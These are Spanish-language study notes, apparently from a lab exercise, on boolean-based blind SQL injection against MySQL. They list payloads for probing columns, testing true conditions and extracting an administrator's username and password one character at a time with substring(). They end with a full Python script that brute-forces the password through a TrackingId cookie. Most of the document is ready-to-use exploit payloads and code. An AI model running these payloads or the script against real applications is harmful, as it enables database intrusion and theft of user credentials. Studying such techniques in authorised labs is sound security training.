# Inyección SQL Blind con Respuesta Condicional 

Tags: #SQLI #MySQL #BurpSuite 

-  [ExtendeClass Online](https://extendsclass.com/mysql-online.html)
Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.

```mysql 
❯ ' order by 3 -- -          # Conocer el numero de columnas 
❯ ' and 1=1 -- -             # Colocar un true 
❯ ' and 'a'='a' -- -         # Colocar un true 

# Nested queries 
❯ ' and (select 'a')='a' -- -      # Insertar una subquery (subconsulta)

# Si existe un usuario 'administrator' en la base de datos usando una comparación booleana, la subconsulta devuelve 'a' y la comparación se cumple.
❯ ' and (select 'a' from users where username='administrator')='a' -- -   
	# Nombre de la tabla = users
	# Nombre de la columna = username y password
	# Datos de la columna 'username' = administrator
```

## Conocer el usuario 

```mysql
# Si el usuario 'administrator' existe y si su nombre empieza con la letra 'a', usando una subconsulta con 'substring()' y una comparación booleana, entonces la condición será verdadera y la consulta se ejecutará normalmente
❯ ' and (select substring(username,1,1) from users where username='administrator')='a' -- -
	# substring = Permite que de una cadena dada quedarse con un conjunto de caracteres 
	# 1,1 = Hacer alución al primer caracter de la cadena (El que varia es el primer '1')
```

## Conocer la password 

```mysql 
# Conocer la longitud de la password 
❯ ' and (select 'a' from users where username='administrator' and length(password)=20)='a' -- -  

# Se utilizara el campo de 'a' para ir sustituyendo las letras del abcdario, así como numeros para ir encontrando los caracteres de la password 
❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- -

Nota:
	1. Si se encuentra el primer caracter ya sea letra o numero, para encontrar el segundo se debe variar el primer '1' a '2' y asi sucesivamente del substring()
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"
characters = string.ascii_letters + string.digits    # Se puede colocar string.printable

def MakeSQLI():

    password = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1, 21):
	    for character in characters:
		    cookies = {
			    "TrackingId": "valor' and (select substring(password,%d,1) from users where username='administrator')='%s' -- -" % (position, character),
			    "session": "valor"           # El valor se obtiene de Burpsuite
		    }
		    p1.status(cookies['TrackingId'])
		    r = requests.get(main_url, cookies=cookies)
		    if "Welcome back" in r.text:  # Si el texto esta en la respuesta, colocar el caracter en passwd
			    password += character
			    p2.status(password)
			    break

if __name__ == '__main__':
    MakeSQLI()
```